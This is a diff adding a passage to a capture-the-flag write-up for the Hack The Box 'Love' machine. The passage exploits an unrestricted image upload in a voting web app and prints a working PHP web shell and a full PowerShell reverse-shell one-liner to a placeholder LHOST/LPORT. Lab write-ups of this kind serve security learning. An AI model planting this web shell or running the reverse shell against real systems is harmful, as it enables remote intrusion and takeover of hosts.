@@ -200,7 +200,102 @@ Lets refresh the webpage
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28483ce8-d9de-4357-bc7d-9e4a377e1cca)
 
-nice nice
+nice nice. Now lets try to get a reverse shell from here
+
+We'll start out by creating a "position"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8254db89-4566-4797-84b3-88dce1faa448)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e951c3f-d067-43b9-bcbe-d34fc8041e91)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed090bd7-3436-4335-ad6c-418cd04fab2e)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/503aac39-ccb4-47e1-9ed2-550450c0e4e9)
+
+nice nice, now lets add candidates
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f07a2ab1-e2ae-4ec2-8b0c-df0029e80298)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/437d9f1c-d263-477b-98f3-3be041d8cffa)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e283c9b-36b2-4c17-91a6-7b00c54648ec)
+
+As you can see from the above screenshot that there's an upload button.
+
+We\ll create a candidate named ```Venus``` , we'll start out by uploading a png image
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2ca8b155-96ac-42df-9cc6-a85ac5f87276)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6f3bc524-8077-4e79-b3ce-159557315bab)
+
+cool, so png images are allowed.
+
+Lets try to create another candidate ```Sensei```, but this time we'll upload a jpeg image
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5aaedc23-b7c7-424d-b93f-45d2596f6cac)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c7f49889-d181-4020-901e-4e826126a949)
+
+nice nice, lets take this up a notch by trying to upload a php file
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
+└─$ nano vawulence.php 
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
+└─$ cat vawulence.php 
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+That's the content of my php file. So we\ll try to upload this.
+
+Now, lets create another user ```vizards```, but this time we'll be uploading a php script
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f7b4a2e-699e-485b-9625-2bf730b6ab53)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0b247e1-dd19-4952-8672-0ddc634e7ef3)
+
+As you can see our script got uploaded without any issues, to execute this script right-click on the script and then choose "Open image in new tab".
+
+If you used the same payload I used for my php script, you should get this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/577c000b-609d-44be-aa06-80d90813e6ec)
+
+Lets try to execute the command ```whoami```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/073380aa-7dc4-4b65-800c-a6479b788f47)
+
+nice nice, we can spawn a reverse shell from here using the payload
+
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+Ensure you edit the ```LHOST``` and ```LPORT``` before using this. Also, ensure you have your netcat listener listening for incoming connections.
+
+Applying this payload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3af5f0bd-3d62-4fe3-a41d-0a83d869dc9d)
+
+Checking my netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7b4d07c-c60d-47f2-9357-c0018d648096)
+
+We spawned a shell as user ```phoebe```. Lets go ahead and escalate our privileges.
+
+
+
+# Privilege Escalation
+
+
+
+
 
 
 
